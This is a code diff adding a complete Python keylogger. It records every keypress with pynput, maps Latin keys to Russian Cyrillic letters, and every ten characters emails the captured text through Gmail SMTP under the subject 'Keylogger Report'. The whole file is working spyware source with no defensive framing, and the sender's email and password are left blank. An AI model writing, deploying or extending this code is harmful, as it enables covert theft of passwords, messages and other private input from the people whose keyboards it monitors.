@@ -1,0 +1,79 @@
+from pynput import keyboard
+import smtplib
+import threading
+import time
+from email.mime.text import MIMEText
+
+email = ''
+PASSWORD = ''
+to_email = email
+
+log = []  
+
+RUSSIAN_MAP = {
+    'f': 'а', ',': 'б', 'd': 'в', 'u': 'г', 'l': 'д', 't': 'е',
+    '`': 'ё', ';': 'ж', 'p': 'з', 'b': 'и', 'q': 'й', 'r': 'к',
+    'k': 'л', 'v': 'м', 'y': 'н', 'j': 'о', 'g': 'п', 'h': 'р',
+    'c': 'с', 'n': 'т', 'e': 'у', 'a': 'ф', '[': 'х', 'w': 'ц',
+    'x': 'ч', 'i': 'ш', 'o': 'щ', ']': 'ъ', 's': 'ы', 'm': 'ь',
+    "'": 'э', '.': 'ю', 'z': 'я'
+}
+
+
+def send_log():
+    """Отправляет накопленные символы на почту"""
+    global log
+    if len(log) < 10:
+        return
+
+    # 10 ласт символов
+    message_text = ''.join(log[-10:])
+    del log[-10:]
+
+    try:
+        msg = MIMEText(f"Последние нажатия: {message_text}", 'plain', 'utf-8')
+        msg['Subject'] = 'Keylogger Report (10 symbols)'
+        msg['From'] = email
+        msg['To'] = to_email
+
+        with smtplib.SMTP('smtp.gmail.com', 587) as server:
+            server.starttls()
+            server.login(email, PASSWORD)
+            server.sendmail(email, to_email, msg.as_string())
+    except Exception as e:
+        print(f'Ошибка отправки: {e}')
+
+
+def on_press(key):
+    """Обрабатывает нажатия клавиш"""
+    global log
+
+    try:
+        char = key.char
+
+        lower_char = char.lower()
+        if lower_char in RUSSIAN_MAP:
+            char = RUSSIAN_MAP[lower_char]
+            if char.isupper():
+                char = char.upper()
+
+        log.append(char)
+
+    except AttributeError:
+        pass
+
+    if len(log) >= 10:
+        threading.Thread(target=send_log, daemon=True).start()
+
+
+# запуск
+listener = keyboard.Listener(on_press=on_press)
+listener.daemon = True
+listener.start()
+
+# основной цикл
+try:
+    while True:
+        time.sleep(1)
+except KeyboardInterrupt:
+    listener.stop()
